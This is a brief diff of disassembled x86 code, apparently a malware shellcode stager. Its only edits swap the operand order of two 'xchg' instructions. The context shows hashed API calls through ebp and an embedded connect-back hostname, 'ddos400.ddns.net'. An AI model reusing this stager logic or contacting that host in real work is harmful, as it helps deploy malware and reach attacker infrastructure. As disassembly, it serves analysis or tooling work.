@@ -99,7 +99,7 @@ bbl_0x0088:
     0x00b2: push eax
     0x00b3: push 0xe0df0fea
     0x00b8: call ebp
-    0x00ba: xchg eax, edi
+    0x00ba: xchg edi, eax
     0x00bb: call 0xd1
 .db 'ddos400.ddns.net',0
 bbl_0x00d1:
@@ -138,7 +138,7 @@ bbl_0x0100:
     0x0117: push 0
     0x0119: push 0xe553a458
     0x011e: call ebp
-    0x0120: xchg eax, ebx
+    0x0120: xchg ebx, eax
     0x0121: push ebx
 bbl_0x0122:
     0x0122: push 0
